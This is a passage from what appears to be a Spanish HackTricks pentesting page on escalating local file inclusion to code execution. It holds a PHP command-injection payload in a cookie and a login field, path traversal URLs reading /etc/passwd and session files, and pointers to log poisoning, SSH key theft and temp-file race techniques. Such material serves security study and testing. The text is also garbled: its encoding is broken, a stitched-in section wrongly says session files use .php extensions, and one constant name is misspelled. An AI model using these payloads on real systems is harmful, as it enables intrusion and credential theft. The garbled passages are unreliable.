Establece la cookie a `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# Inclusi√≥n de archivos PHP de sesi√≥n utilizando LFI

La inclusi√≥n de archivos locales (LFI, por sus siglas en ingl√©s) es una vulnerabilidad com√∫n en aplicaciones web que permite a un atacante incluir archivos arbitrarios en el servidor. Una forma com√∫n de explotar esta vulnerabilidad es incluir el archivo de sesi√≥n PHP para obtener acceso a la sesi√≥n de un usuario.

## Paso 1: Identificar la vulnerabilidad LFI

El primer paso es identificar si la aplicaci√≥n web es vulnerable a la inclusi√≥n de archivos locales. Esto se puede hacer enviando una solicitud HTTP con una ruta de archivo maliciosa en los par√°metros de la URL. Por ejemplo:

```
http://example.com/page.php?file=../../../etc/passwd
```

Si la aplicaci√≥n muestra el contenido del archivo `/etc/passwd`, es probable que sea vulnerable a la inclusi√≥n de archivos locales.

## Paso 2: Incluir el archivo de sesi√≥n PHP

Una vez que se ha identificado la vulnerabilidad LFI, el siguiente paso es incluir el archivo de sesi√≥n PHP. El archivo de sesi√≥n suele tener una extensi√≥n como `.php` o `.php5`. La ubicaci√≥n del archivo de sesi√≥n puede variar dependiendo de la configuraci√≥n del servidor y del lenguaje de programaci√≥n utilizado.

Para incluir el archivo de sesi√≥n, se puede utilizar una ruta relativa o absoluta en el par√°metro de la URL. Por ejemplo:

```
http://example.com/page.php?file=/var/lib/php/sessions/sess_123456
```

Esto incluir√° el archivo de sesi√≥n `sess_123456` ubicado en el directorio `/var/lib/php/sessions/`.

## Paso 3: Explotar la sesi√≥n

Una vez que se ha incluido el archivo de sesi√≥n PHP, el atacante puede obtener acceso a la sesi√≥n del usuario y realizar acciones en su nombre. Esto puede incluir robar informaci√≥n confidencial, modificar datos o realizar acciones no autorizadas.

Es importante tener en cuenta que la inclusi√≥n de archivos locales puede tener consecuencias graves y debe ser abordada y solucionada por los desarrolladores de la aplicaci√≥n lo antes posible.

## Medidas preventivas

Para prevenir la inclusi√≥n de archivos locales, se recomienda:

- Validar y filtrar adecuadamente las entradas del usuario para evitar la inclusi√≥n de rutas de archivo maliciosas.
- Utilizar rutas absolutas en lugar de rutas relativas para incluir archivos.
- Limitar los permisos de acceso del servidor web para evitar que se incluyan archivos sensibles.
- Mantener el software y los sistemas actualizados para evitar vulnerabilidades conocidas.

Recuerda que la inclusi√≥n de archivos locales es una t√©cnica de hacking y solo debe ser utilizada con fines √©ticos y legales, como parte de una evaluaci√≥n de seguridad autorizada.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### A trav√©s de ssh

Si ssh est√° activo, verifica qu√© usuario se est√° utilizando (/proc/self/status y /etc/passwd) e intenta acceder a **\<HOME>/.ssh/id\_rsa**

### A trav√©s de los registros de **vsftpd**

Los registros de este servidor FTP se almacenan en _**/var/log/vsftpd.log**_. Si tienes una LFI y puedes acceder a un servidor vsftpd expuesto, puedes intentar iniciar sesi√≥n estableciendo la carga √∫til de PHP en el nombre de usuario y luego acceder a los registros utilizando la LFI.

### A trav√©s de filtros de php (sin necesidad de un archivo)

Este [**documento**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que puedes usar **filtros de php para generar contenido arbitrario** como salida. B√°sicamente, esto significa que puedes **generar c√≥digo php arbitrario** para la inclusi√≥n **sin necesidad de escribirlo** en un archivo.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### A trav√©s de una falla de segmentaci√≥n

**Carga** un archivo que se almacenar√° de forma **temporal** en `/tmp`, luego en la **misma solicitud**, provoca una **falla de segmentaci√≥n**, y luego el **archivo temporal no se eliminar√°** y podr√°s buscarlo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### A trav√©s del almacenamiento temporal de archivos de Nginx

Si encontraste una **Inclusi√≥n Local de Archivos** y **Nginx** se est√° ejecutando frente a PHP, es posible que puedas obtener RCE con la siguiente t√©cnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### A trav√©s de PHP\_SESSION\_UPLOAD\_PROGRESS

Si encontraste una **Inclusi√≥n Local de Archivos**, incluso si **no tienes una sesi√≥n** y `session.auto_start` est√° en `Off`. Si proporcionas **`PHP_SESSION_UPLOAD_PROGRESS`** en los datos **multipart POST**, PHP **habilitar√° la sesi√≥n por ti**. Puedes abusar de esto para obtener RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### A trav√©s de la carga de archivos temporales en Windows

Si encontraste una **Inclusi√≥n Local de Archivos** y el servidor se est√° ejecutando en **Windows**, es posible que obtengas RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### A trav√©s de phpinfo() (file\_uploads = on)

Si encontraste una **Inclusi√≥n Local de Archivos** y un archivo que expone **phpinfo()** con file\_uploads = on, puedes obtener RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### A trav√©s de compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulgaci√≥n de ruta

Si encontraste una **Inclusi√≥n Local de Archivos** y puedes **filtrar la ruta** del archivo temporal PERO el **servidor** est√° **verificando** si el **archivo a incluir tiene marcas de PHP**, puedes intentar **burlar esa verificaci√≥n** con esta **Condici√≥n de Carrera**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### A trav√©s de espera eterna + fuerza bruta

Si puedes abusar de la LFI para **cargar archivos temporales** y hacer que el servidor **bloquee** la ejecuci√≥n de PHP, luego puedes **realizar fuerza bruta de nombres de archivo durante horas** para encontrar el archivo temporal:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Hasta el Error Fatal

Si incluyes cualquiera de los archivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Necesitas incluir el mismo dos veces para generar ese error).

**No s√© c√≥mo es √∫til esto, pero podr√≠a serlo.**\
_Incluso si causa un Error Fatal de PHP, los archivos temporales de PHP cargados se eliminan._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referencias

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptograf√≠a.**

**Obt√©n recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Recibir√°s la recompensa despu√©s de que se verifique el error.

**Obt√©n experiencia en pentesting web3**\
¬°Los protocolos blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus d√≠as de crecimiento.

**Convi√©rtete en una leyenda de los hackers web3**\
Gana puntos de reputaci√≥n con cada error verificado y conquista la cima de la clasificaci√≥n semanal.

[**Reg√≠strate en HackenProof**](https://hackenproof.com/register) ¬°comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
